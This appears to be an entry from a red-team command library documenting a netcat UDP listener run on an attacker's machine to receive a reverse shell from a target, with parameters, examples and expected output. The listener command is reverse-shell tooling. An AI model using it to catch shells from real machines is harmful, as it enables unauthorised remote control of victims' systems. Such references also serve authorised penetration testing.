---
id: 07dc0d8b-a967-4660-b8aa-a7e386a27c51
name: nc-udp-listener
type: command
executor: bash
data: nc -u -lvp $_PORT
output: null
created_at: '2023-04-06T03:56:24.171860+00:00'
updated_at: '2023-04-10T20:25:29.507741+00:00'
platforms:
  - Linux
tags:
  - netcat
  - listener
  - udp
verified: true
validated: true
---

# nc-udp-listener

## Command

```bash
nc -u -lvp $_PORT
```

## Description

This command uses netcat to create a UDP listener on the specified port, waiting for incoming connections from a target machine executing a reverse shell. It is run on the attacker's machine to receive the shell session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PORT | The UDP port to listen on (e.g., 4242) | Yes |
| -u | Specifies UDP protocol instead of TCP | Built-in |
| -l | Puts netcat in listen mode | Built-in |
| -v | Enables verbose output to show connection details | Built-in |
| -p | Specifies the local port (integrated with $_PORT in some netcat versions) | Built-in |

## Examples

### Basic Usage

```bash
nc -u -lvp 4242
```

### Advanced Usage

For more verbose logging or with timeout (if supported):
```bash
nc -u -lvp 4242 -w 30
```

## Expected Output

Initial bind:
```
listening on [any] 4242 ...
```

On connection:
```
connect to [target_ip] from (UNKNOWN) [target_ip] 4242
[attacker_prompt]$
```

The prompt allows entering commands, with output from the target (e.g., `whoami` returns target user).

## Related

- [[procedures/Establish-Bash-UDP-Reverse-Shell]]
